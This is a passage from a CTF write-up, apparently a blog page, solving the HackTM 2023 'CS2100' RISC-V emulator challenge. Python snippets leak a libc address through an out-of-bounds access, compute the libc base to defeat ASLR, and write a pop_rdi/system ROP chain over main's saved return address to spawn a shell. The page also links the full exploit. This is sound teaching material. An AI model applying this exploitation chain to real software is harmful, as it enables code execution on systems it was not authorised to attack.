+<h4 id="leaking-addresses">Leaking Addresses</h4>
+
+<p>On the stack, the return address of main (save RIP) is at <code class="language-plaintext highlighter-rouge">mem[sp+0x18]</code> as previously identified. The return address of main is usually a <strong>libc</strong> address at <em>__libc_start_main</em>. This address can therefore be ‘leaked’ by writing it into one of the VM’s registers.</p>
+
+<p>The following python code snippet is used to leak this address and loads it into the <code class="language-plaintext highlighter-rouge">A0</code> register.</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">exec_LD</span><span class="p">(</span><span class="n">rd</span><span class="o">=</span><span class="n">A0</span><span class="p">,</span> <span class="n">rs1</span><span class="o">=</span><span class="mi">2</span><span class="p">,</span> <span class="n">imm</span><span class="o">=</span><span class="mh">0x18</span><span class="p">)</span>
+</code></pre></div></div>
+<p><img src="https://i.imgur.com/BpIHQBF.png" alt="" /></p>
+
+<p>From the debugger, (in my current machine), this address is an address at <code class="language-plaintext highlighter-rouge">__libc_start_call_main+122</code>. The address of <code class="language-plaintext highlighter-rouge">__libc_start_main</code> from the leaked address is <code class="language-plaintext highlighter-rouge">leaked_address + 0x36</code>.</p>
+
+<p>Using the <em>exec_ADDI</em> instruction, we will add and subtract the above values and store the result in the same <code class="language-plaintext highlighter-rouge">A0</code> register. The reson why we do not use an exec_SUB instruction, is because this does not exist as an instruction in RISC-IV. More can be read <a href="https://itnext.io/risc-v-instruction-set-cheatsheet-70961b4bbe8">here</a></p>
+
+<p>The following python code snippet can be used for this action.</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">exec_ADDI</span><span class="p">(</span><span class="n">rd</span><span class="o">=</span><span class="n">A0</span><span class="p">,</span> <span class="n">rs1</span><span class="o">=</span><span class="n">A0</span><span class="p">,</span> <span class="n">imm</span><span class="o">=</span><span class="mh">0x36</span><span class="p">),</span>
+
+</code></pre></div></div>
+
+<p>With the address of <code class="language-plaintext highlighter-rouge">__libc_start_main</code> leaked, we can now calculate the base address of libc, to be able to bypass ASLR. The <em>exec_ADDI</em> instruction, will then be used here again to subtract the value of <em>libc.sym[“__libc_start_main”]</em> that is at <code class="language-plaintext highlighter-rouge">0x271c0</code>.</p>
+
+<p>From the source code, we cannot subtract the whole value <code class="language-plaintext highlighter-rouge">0x271c0</code> since <em>exec_ADDI</em> can only support 12-bit signed numbers. We therefore need to find a way to only subtract the 12-bit signed numbers and this can be done via a loop..First we need to subract <code class="language-plaintext highlighter-rouge">0xc0</code> to remain with <code class="language-plaintext highlighter-rouge">0x27100</code>. A loop that loops <code class="language-plaintext highlighter-rouge">0x27100//0x100</code> times can therefore be used to subtract this value concurrently.</p>
+
+<p>The following python code snippet can be used for this action.</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">exec_ADDI</span><span class="p">(</span><span class="n">rd</span><span class="o">=</span><span class="n">A1</span><span class="p">,</span> <span class="n">rs1</span><span class="o">=</span><span class="n">A0</span><span class="p">,</span> <span class="n">imm</span><span class="o">=-</span><span class="mh">0xc0</span><span class="p">)</span>
+
+<span class="k">for</span> <span class="n">_</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mh">0x27100</span><span class="o">//</span><span class="mh">0x100</span><span class="p">):</span> <span class="n">payload</span> <span class="o">+=</span> <span class="n">flat</span><span class="p">(</span><span class="n">exec_ADDI</span><span class="p">(</span><span class="n">rd</span><span class="o">=</span><span class="n">A1</span><span class="p">,</span> <span class="n">rs1</span><span class="o">=</span><span class="n">A1</span><span class="p">,</span> <span class="n">imm</span><span class="o">=</span><span class="mh">0x100</span><span class="p">))</span>
+</code></pre></div></div>
+
+<p>As shown below the based address of libc is returned and stored in the <strong>A1</strong> register.</p>
+
+<p><img src="https://i.imgur.com/PJbPG9S.png" alt="" /></p>
+
+<h3 id="return-oriented-programming-attack">Return-Oriented-Programming Attack</h3>
+
+<p>With the base address of libc, a rop attack can be chained for code execution. From the current libc of my machine the address of <code class="language-plaintext highlighter-rouge">libc.sym['system']</code> was <code class="language-plaintext highlighter-rouge">0x4c330</code>. This address was written to a chosen register in this case the <code class="language-plaintext highlighter-rouge">A3</code> register using the following source code snippet.</p>
+
+<blockquote>
+  <p>NOTE: Remember the 12-bit signed integer limit on <em>exec_ADDI</em>.</p>
+</blockquote>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">exec_ADDI</span><span class="p">(</span><span class="n">rd</span><span class="o">=</span><span class="n">A2</span><span class="p">,</span> <span class="n">rs1</span><span class="o">=</span><span class="n">A2</span><span class="p">,</span> <span class="n">imm</span><span class="o">=</span><span class="mh">0x4c3</span><span class="p">),</span>
+<span class="n">exec_SLLI</span><span class="p">(</span><span class="n">rd</span><span class="o">=</span><span class="n">A2</span><span class="p">,</span> <span class="n">rs1</span><span class="o">=</span><span class="n">A2</span><span class="p">,</span> <span class="n">imm</span><span class="o">=</span><span class="mh">0x8</span><span class="p">)</span><span class="c1"># &gt;&gt; 8
+</span><span class="n">exec_ADDI</span><span class="p">(</span><span class="n">rd</span><span class="o">=</span><span class="n">A2</span><span class="p">,</span> <span class="n">rs1</span><span class="o">=</span><span class="n">A2</span><span class="p">,</span> <span class="n">imm</span><span class="o">=</span><span class="mh">0x30</span><span class="p">)</span>
+</code></pre></div></div>
+<p>With the address of <code class="language-plaintext highlighter-rouge">libc.sym['system']</code> in one of the registers, this address can be added to the libc_base address and saved to a different ‘register’. This can be done using the <em>exec_ADD</em> instruction that add’s two values from ‘registers’.</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">exec_ADD</span><span class="p">(</span><span class="n">rd</span><span class="o">=</span><span class="n">A3</span><span class="p">,</span> <span class="n">rs1</span><span class="o">=</span><span class="n">A1</span><span class="p">,</span> <span class="n">rs2</span><span class="o">=</span><span class="n">A2</span><span class="p">)</span>
+</code></pre></div></div>
+
+<p><img src="https://i.imgur.com/M6E1Ngz.png" alt="" /></p>
+
+<p>As shown above, the address of system has been written to the <code class="language-plaintext highlighter-rouge">A3</code> register. The rest of the addresses <em>pop_rdi</em>, <em>ret</em>, and the address of system were written to the <code class="language-plaintext highlighter-rouge">A4</code>, <code class="language-plaintext highlighter-rouge">A5</code> and <code class="language-plaintext highlighter-rouge">A6</code> respectively, with their absolute addresses written to <code class="language-plaintext highlighter-rouge">S2</code>, <code class="language-plaintext highlighter-rouge">S3</code> and <code class="language-plaintext highlighter-rouge">S4</code> respectively from the following python code snippet:</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+<span class="n">exec_ADDI</span><span class="p">(</span><span class="n">rd</span><span class="o">=</span><span class="n">A4</span><span class="p">,</span> <span class="n">rs1</span><span class="o">=</span><span class="n">A4</span><span class="p">,</span> <span class="n">imm</span><span class="o">=</span><span class="mh">0x196</span><span class="p">)</span>
+<span class="n">exec_SLLI</span><span class="p">(</span><span class="n">rd</span><span class="o">=</span><span class="n">A4</span><span class="p">,</span> <span class="n">rs1</span><span class="o">=</span><span class="n">A4</span><span class="p">,</span> <span class="n">imm</span><span class="o">=</span><span class="mh">0xc</span><span class="p">)</span>
+<span class="n">exec_ADDI</span><span class="p">(</span><span class="n">rd</span><span class="o">=</span><span class="n">A4</span><span class="p">,</span> <span class="n">rs1</span><span class="o">=</span><span class="n">A4</span><span class="p">,</span> <span class="n">imm</span><span class="o">=</span><span class="mh">0x031</span><span class="p">)</span>
+
+<span class="c1">#pop_rdi
+</span><span class="n">exec_ADDI</span><span class="p">(</span><span class="n">rd</span><span class="o">=</span><span class="n">A5</span><span class="p">,</span> <span class="n">rs1</span><span class="o">=</span><span class="n">A5</span><span class="p">,</span> <span class="n">imm</span><span class="o">=</span><span class="mh">0x277</span><span class="p">)</span>
+<span class="n">exec_SLLI</span><span class="p">(</span><span class="n">rd</span><span class="o">=</span><span class="n">A5</span><span class="p">,</span> <span class="n">rs1</span><span class="o">=</span><span class="n">A5</span><span class="p">,</span> <span class="n">imm</span><span class="o">=</span><span class="mh">0x8</span><span class="p">)</span>
+<span class="n">exec_ADDI</span><span class="p">(</span><span class="n">rd</span><span class="o">=</span><span class="n">A5</span><span class="p">,</span> <span class="n">rs1</span><span class="o">=</span><span class="n">A5</span><span class="p">,</span> <span class="n">imm</span><span class="o">=</span><span class="mh">0x25</span><span class="p">)</span>
+
+<span class="c1">#ret
+</span><span class="n">exec_ADDI</span><span class="p">(</span><span class="n">rd</span><span class="o">=</span><span class="n">A6</span><span class="p">,</span> <span class="n">rs1</span><span class="o">=</span><span class="n">A6</span><span class="p">,</span> <span class="n">imm</span><span class="o">=</span><span class="mh">0x270</span><span class="p">)</span>
+<span class="n">exec_SLLI</span><span class="p">(</span><span class="n">rd</span><span class="o">=</span><span class="n">A6</span><span class="p">,</span> <span class="n">rs1</span><span class="o">=</span><span class="n">A6</span><span class="p">,</span> <span class="n">imm</span><span class="o">=</span><span class="mh">0x8</span><span class="p">)</span>
+<span class="n">exec_ADDI</span><span class="p">(</span><span class="n">rd</span><span class="o">=</span><span class="n">A6</span><span class="p">,</span> <span class="n">rs1</span><span class="o">=</span><span class="n">A6</span><span class="p">,</span> <span class="n">imm</span><span class="o">=</span><span class="mh">0xc2</span><span class="p">)</span>
+</code></pre></div></div>
+
+<p>These absolute libc addresses of the above gadgets can further be written into the <code class="language-plaintext highlighter-rouge">S2</code>, <code class="language-plaintext highlighter-rouge">S3</code> and <code class="language-plaintext highlighter-rouge">S4</code> register from the following python code snippet:</p>
+
+<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+<span class="n">exec_ADD</span><span class="p">(</span><span class="n">rd</span><span class="o">=</span><span class="n">S2</span><span class="p">,</span> <span class="n">rs1</span><span class="o">=</span><span class="n">A1</span><span class="p">,</span> <span class="n">rs2</span><span class="o">=</span><span class="n">A4</span><span class="p">),</span> <span class="c1"># binsh
+</span><span class="n">exec_ADD</span><span class="p">(</span><span class="n">rd</span><span class="o">=</span><span class="n">S3</span><span class="p">,</span> <span class="n">rs1</span><span class="o">=</span><span class="n">A1</span><span class="p">,</span> <span class="n">rs2</span><span class="o">=</span><span class="n">A5</span><span class="p">),</span> <span class="c1"># pop_rdi
+</span><span class="n">exec_ADD</span><span class="p">(</span><span class="n">rd</span><span class="o">=</span><span class="n">S4</span><span class="p">,</span> <span class="n">rs1</span><span class="o">=</span><span class="n">A1</span><span class="p">,</span> <span class="n">rs2</span><span class="o">=</span><span class="n">A6</span><span class="p">),</span> <span class="c1"># ret
+</span>
+</code></pre></div></div>
+
+<p><img src="https://i.imgur.com/w1rZnrt.png" alt="" /></p>
+
+<p>The <em>OOBW</em> vulnerability can now be used to overwrite the saved return address of main at <code class="language-plaintext highlighter-rouge">mem[sp+0x18]</code> with the above addresses in the ‘registers’. The rop chain should be in the following format:</p>
+
+<p><code class="language-plaintext highlighter-rouge">pop_rdi Gadget</code> + <code class="language-plaintext highlighter-rouge">&amp;binsh</code> + <code class="language-plaintext highlighter-rouge">ret gadget</code> + <code class="language-plaintext highlighter-rouge">&amp;System()</code>.</p>
+
+<p><em>The above gadgets were returned from libc with the return gagdget used to align the stack</em></p>
+
+<p>These addresses can be written to <em>main’s</em> stack using the <em>exec_SD</em> instruction as follows:</p>
+
+<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#overwrite values on the stack
+</span><span class="n">exec_SD</span><span class="p">(</span><span class="n">rs1</span><span class="o">=</span><span class="n">SP</span><span class="p">,</span> <span class="n">rs2</span><span class="o">=</span><span class="n">S3</span><span class="p">,</span> <span class="n">imm</span><span class="o">=</span><span class="mi">24</span><span class="p">),</span> <span class="c1"># pop_rdi
+</span><span class="n">exec_SD</span><span class="p">(</span><span class="n">rs1</span><span class="o">=</span><span class="n">SP</span><span class="p">,</span> <span class="n">rs2</span><span class="o">=</span><span class="n">s2</span><span class="p">,</span> <span class="n">imm</span><span class="o">=</span><span class="mi">32</span><span class="p">),</span> <span class="c1"># &amp;binsh
+</span><span class="n">exec_SD</span><span class="p">(</span><span class="n">rs1</span><span class="o">=</span><span class="n">SP</span><span class="p">,</span> <span class="n">rs2</span><span class="o">=</span><span class="n">S4</span><span class="p">,</span> <span class="n">imm</span><span class="o">=</span><span class="mi">40</span><span class="p">),</span> <span class="c1"># ret
+</span><span class="n">exec_SD</span><span class="p">(</span><span class="n">rs1</span><span class="o">=</span><span class="n">SP</span><span class="p">,</span> <span class="n">rs2</span><span class="o">=</span><span class="n">A3</span><span class="p">,</span> <span class="n">imm</span><span class="o">=</span><span class="mi">48</span><span class="p">),</span> <span class="c1"># &amp;system
+</span></code></pre></div></div>
+
+<p>The above code snippet will overwrite the saved return address with the above rop chain, and when the application is run and the bin file is passed to it as its argument, this returns a shell for code execution as shown below:</p>
+
+<p><img src="https://i.imgur.com/4nMYgZI.png" alt="" /></p>
+
+<p>The full exploit code can be found here <a href="https://github.com/mutur4/ctf-writeups/blob/main/HackTM2023/cs2100/exploit.py">exploit.py</a></p>
+
+<h3 id="conclusion">Conclusion</h3>
+
+<p>On the instance that was hosting the challenge, it prevented the spawning of a remote shell to read the a flag by redirecting <code class="language-plaintext highlighter-rouge">stdin</code> to <em>/dev/null</em>.  This therefore required reading the flag directly, using <code class="language-plaintext highlighter-rouge">/bin/cat flag</code>, that could either be written to memory in one of the RISC-V registers and passed to <em>system()</em> or <em>execve()</em>.</p>
+
+
+  </div>
+
+  <a class="u-url" href="/ctfs/2023-03-05-HackTM-CS2100/" hidden></a>
+</article>
+
+      </div>
+    </main><link id="fa-stylesheet" rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@latest/css/all.min.css">
+
+<footer class="site-footer h-card">
+  <data class="u-url" value="/"></data>
+
+  <div class="wrapper">
+
+    <div class="footer-col-wrapper">
+      <div class="footer-col">
+      </div>
+      <div class="footer-col">
+        <p></p>
+      </div>
+    </div>
+
+    <div class="social-links"><ul class="social-media-list"><li>
+    <a rel="me" href="https://x.com/BinaryChunk" target="_blank" title="BinaryChunk on X">
+      <span class="grey fa-brands fa-x-twitter fa-lg"></span>
+    </a>
+  </li><li>
+    <a rel="me" href="https://github.com/mutur4" target="_blank" title="BinaryChunk on Github">
+      <span class="grey fa-brands fa-github fa-lg"></span>
+    </a>
+  </li>
+</ul>
+</div>
+
+  </div>
+
+</footer>
+
+</body>
+
+</html>
